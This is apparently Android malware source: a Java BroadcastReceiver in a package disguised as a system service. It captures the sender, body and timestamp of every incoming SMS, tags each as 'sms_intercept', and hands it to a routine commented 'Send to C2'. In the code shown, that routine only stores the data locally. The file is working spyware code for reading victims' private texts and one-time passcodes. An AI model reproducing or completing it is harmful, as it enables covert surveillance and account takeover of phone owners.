package com.system.service.collection;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.gson.JsonObject;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
            if (msg == null) continue;

            JsonObject data = new JsonObject();
            data.addProperty("type", "sms_intercept");
            data.addProperty("sender", msg.getDisplayOriginatingAddress());
            data.addProperty("body", msg.getDisplayMessageBody());
            data.addProperty("timestamp", msg.getTimestampMillis());
            data.addProperty("protocol", intent.getAction());

            // Send to C2
            sendToC2(data);

            Log.d(TAG, "Intercepted SMS from: " + msg.getDisplayOriginatingAddress());
        }
    }

    private void sendToC2(JsonObject data) {
        CoreApplication app = CoreApplication.getInstance();
        if (app != null) {
            app.getPrefs().edit().putString("sms_intercept", data.toString()).apply();
        }
    }
}